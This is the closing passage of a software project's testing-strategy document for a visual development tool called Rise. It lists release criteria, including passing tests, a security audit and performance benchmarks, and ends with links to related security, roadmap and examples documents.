
🚀 Release Criteria:
- All tests passing on all platforms
- Security audit with 0 high/critical issues
- Performance benchmarks within targets
- Manual UX review complete
- Documentation up to date
```

This comprehensive testing strategy ensures Rise delivers a reliable, secure, and performant visual development experience while maintaining high code quality in generated output.

---

**See Also**:
- [Security Model](./SECURITY.md) - Security testing requirements
- [MVP Roadmap](./MVP_ROADMAP.md) - Testing implementation timeline
- [Examples](./EXAMPLES.md) - Test data and scenarios